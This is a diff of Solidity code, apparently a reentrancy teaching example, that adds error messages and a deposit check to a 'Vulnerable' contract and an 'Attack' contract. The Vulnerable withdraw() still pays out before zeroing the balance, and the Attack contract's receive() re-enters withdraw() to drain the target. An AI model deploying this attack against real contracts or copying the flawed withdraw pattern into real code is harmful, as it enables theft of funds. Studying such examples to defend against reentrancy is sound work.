@@ -10,10 +10,10 @@ contract Vulnerable {
 
     function withdraw() public {
         uint amount = balances[msg.sender];
-        require(amount > 0);
+        require(amount > 0, "No balance");
 
         (bool success, ) = msg.sender.call{value: amount}("");
-        require(success);
+        require(success, "Transfer failed");
 
         balances[msg.sender] = 0;
     }
@@ -30,14 +30,21 @@ contract Attack {
         vulnerable = Vulnerable(_vulnerable);
     }
 
+    
     receive() external payable {
-        if(address(vulnerable).balance >= 1 ether) {
+        if (address(vulnerable).balance >= 1 ether) {
             vulnerable.withdraw();
         }
     }
 
+    
     function attack() public payable {
+        require(msg.value >= 1 ether, "Send at least 1 ether");
+
+        
         vulnerable.deposit{value: msg.value}();
+
+        
         vulnerable.withdraw();
     }
 
